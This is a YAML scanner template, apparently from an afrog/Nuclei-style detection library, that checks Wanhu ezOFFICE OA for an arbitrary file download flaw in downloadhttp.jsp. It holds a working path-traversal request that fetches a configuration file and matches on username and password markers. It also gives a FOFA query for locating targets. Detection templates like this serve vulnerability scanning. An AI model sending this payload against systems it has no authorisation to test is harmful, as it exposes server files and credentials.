# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <%
          - //Username
          - //Password
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp'
id: wanhu-oa-downloadhttp-fileread
info:
  author: zan8in
  description: |
    万户OA downloadhttp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
    fofa: app="万户网络-ezOFFICE"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 万户OA downloadhttp.jsp 任意文件下载漏洞
  severity: high
  tags: wanhu,download,http,fileread,argus-import
